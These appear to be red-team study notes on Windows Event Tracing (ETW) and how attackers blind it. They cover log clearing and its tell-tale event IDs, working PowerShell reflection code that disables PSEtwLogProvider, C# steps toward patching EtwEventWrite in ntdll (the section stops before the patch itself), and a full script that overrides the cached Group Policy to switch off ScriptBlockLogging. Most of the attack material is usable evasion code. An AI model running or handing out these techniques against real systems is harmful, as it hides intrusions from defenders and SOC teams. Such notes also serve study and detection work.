
In Windows, nearly all event logging is done by **ETW** (Event Tracing for Windows).
The general method these events are logged are:
```
Device --> Event collector/forwarder --> Data Indexer --> SIEM Server
```

ETW is made up of three main parts:

| Component | Function | Exploit techniques |
| ---- | ---- | ---- |
| Provider | A program with logging tools. After a provider registers, the Controller can enable it, (usually) starting logging. (in some cases, it will log whether it is enabled or not, because the Provider can decide what "enabled" and "disabled" mean for itself.) | PSEtwLogProvider Modification, Group Policy Takeover, Log Pipeline Abuse, Type Creation |
| Controller | Control the starting and stoping of the logging sessions, the location and size of the log files, enable providers to log to the session, obtain execution statistics for sessions. | Patching EtwEventWrite, Runtime Tracing Tampering, |
| Consumers | The tool used to interpret events, usually Microsoft's Event Viewer | Log Smashing, Log Tampering |



#### Aggresive approach - log smashing
Generally, Windows logs can be removed or destroyed. For this approach to work when red teaming, they need to be destroyed before they are (potentially) forwarded to a SIEM server.
The big drawback to this approach is that the action removing logs will generate logs, meaning the SOC team will be able to see the logs were tampered with.
##### Created events
| ID | event |
| ---- | ---- |
| 1102 | The Windows Security Audit log was cleared |
| 104 | The time when the log file was cleared |
| 1100 | The time when the Windows Event Log service was shut down |

### Powershell 
When powershell starts, a `.net` assembly provider pack `PSEtwLogProvider` is loaded. The `.net` assembly provider packs are basically `.net` DLLs.
Because the permissions powershell is loaded with are the same as most permissoins of the `.net` assembly provider packs are loaded with, the same user who spawned the powershell session can disable the providers.
To do this, `m_enabled` needs to be set to `$null`, in three steps:
- Obtain the `.NET` assembly for the `PSEtwLogProvider`
```powershell
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
```
- Store a null value for the `etwProvider` field
  ```powershell
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
```
- Set the field for `m_enabled` to the previously stored `$null`
  ```powershell
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```

### Patching tracing functions
When any process is created, the ETW is loaded (usually from the Common Language Runtime). Within the process, ETW events will be sent and issued from the current process.
If an "early return" is patched into the main ETW function of the process, it can be disabled. 

At a high level, ETW patching follows these steps:
- Obtain a handle for `EtwEventWrite`
The `EtwEventWrite` function is stored in `ntdll`.  To get this, the `LoadLibrary` function needs to be used to load `ntdll`, and the `GetProcAddress` can be used to get the handle.
```csharp
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
```

- Modify memory permissions of the function
  To access the target memory, it needs to be writable. For this, it needs to be loaded using `Virtualprotect`, with the `0x40` (RWX) permissions set:
```csharp
uint oldProtect;
Win32.VirtualProtect(
	etwFunction, 
	(UIntPtr)patch.Length, 
	0x40, 
	out oldProtect
);
```







```powershell
$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static');
  If ($GroupPolicyField) {
      $GroupPolicyCache = $GroupPolicyField.GetValue($null);
      If ($GroupPolicyCache['ScriptBlockLogging']) {
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
      }
      $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new();
      $val.Add('EnableScriptBlockLogging', 0);
      $val.Add('EnableScriptBlockInvocationLogging', 0);
      $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $val
  };
```